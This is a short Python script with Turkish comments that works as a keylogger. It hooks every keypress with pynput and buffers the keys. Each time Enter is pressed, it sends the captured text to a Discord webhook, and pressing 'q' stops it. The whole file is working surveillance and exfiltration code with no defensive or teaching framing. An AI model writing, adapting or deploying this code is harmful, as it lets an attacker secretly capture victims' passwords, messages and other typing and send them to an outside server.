from pynput import keyboard
import requests
import json
import sys

# Webhook URL'sini buraya girin
webhook_url = 'your_webhook_url'

def send_to_discord(message):
    # Mesajı webhook URL'sine gönder
    data = {
        'content': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    if response.status_code != 204:
        print('Webhook gönderme hatası:', response.text)

# Klavye girişlerini toplamak için liste oluştur
keystrokes_list = []

# Klavye girişlerini yakalamak için bir fonksiyon tanımla
def print_keystroke(key):
    # Basılan tuşun karakterini al
    key_char = None
    try:
        key_char = key.char
    except AttributeError:
        pass

    # Tuşun karakteri varsa veya tuş enter değilse listeye ekle
    if key_char:
        key_text = key_char
    else:
        key_text = str(key)

    keystrokes_list.append(key_text)

    # Enter tuşuna basıldığında listeyi birleştir ve Discord'a gönder
    if key == keyboard.Key.enter:
        send_to_discord(' '.join(keystrokes_list))
        keystrokes_list.clear()
    # q tuşuna basıldığında programı sonlandır
    elif key_char == 'q':
        keyboard_listener.stop()
        sys.exit()

# Event handler'ı başlat
keyboard_listener = keyboard.Listener(on_press=print_keystroke)
keyboard_listener.start()

# Programın çalışmasını bekleyin
keyboard_listener.join()
